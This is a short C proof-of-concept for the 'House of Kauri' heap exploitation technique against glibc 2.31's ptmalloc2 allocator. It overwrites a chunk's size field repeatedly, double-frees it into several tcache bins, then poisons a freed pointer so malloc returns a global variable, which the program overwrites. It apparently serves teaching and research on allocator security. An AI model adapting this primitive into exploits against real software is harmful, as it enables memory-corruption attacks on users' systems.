/* House Of Kauri 
https://awaraucom.wordpress.com/2020/06/20/house-of-kauri/ 

This is a demonstration of a novel method for tampering with heap meta-data in ptmalloc2.
It has been tested on GLibc 2.31, Ubuntu 20.04. In terms of exploitation the requirements are as follows:

- Attacker can allocate chunks of variable sizes.
- Attacker can free chunks.
- Attacker can overflow chunks multiple times.
*/

#include <stdio.h>
#include <stdlib.h>

long victim = 1;

int main() {

        int *a, *b, *c, *d, *e;

        a = malloc(20);
        b = malloc(20);

        free(b);
        *((char *)a + 24) = 0x71;
        free(b);
        *((char *)a + 24) = 0x41;
        free(b);
        *((char *)a + 24) = 0x61;
        free(b);

        e = malloc(0x60);
        free(e);

        *e = &victim;
        c = malloc(0x55);
        d = malloc(0x55);
        *d = 2;

        printf("%p is c\n%p is d\n", c, d);
        printf("%d is victim\n", victim);

        return 0;
}
